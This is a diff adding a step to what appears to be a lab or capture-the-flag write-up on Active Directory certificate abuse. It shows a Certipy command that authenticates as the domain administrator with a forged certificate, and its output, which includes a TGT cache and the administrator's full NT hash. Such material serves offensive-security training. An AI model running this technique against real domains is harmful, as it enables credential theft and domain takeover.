@@ -810,5 +810,23 @@ Certipy v5.1.0 - by Oliver Lyak (ly4k)
 ```
 
 ```python
+certipy-ad auth -pfx administrator.pfx -dc-ip 10.1.232.232       
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'Administrator@shadowgate.local'
+[*]     Security Extension SID: 'S-1-5-21-2396436576-3267128377-3646372360-500'
+[*] Using principal: 'administrator@shadowgate.local'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@shadowgate.local': aad3b435b51404eeaad3b435b51404ee:a07b7bbc98b574afe52bbeb5d07d9c0a
+```
+
+Now i have the NTLM hash of the administrator
+
+```python
 
 ```
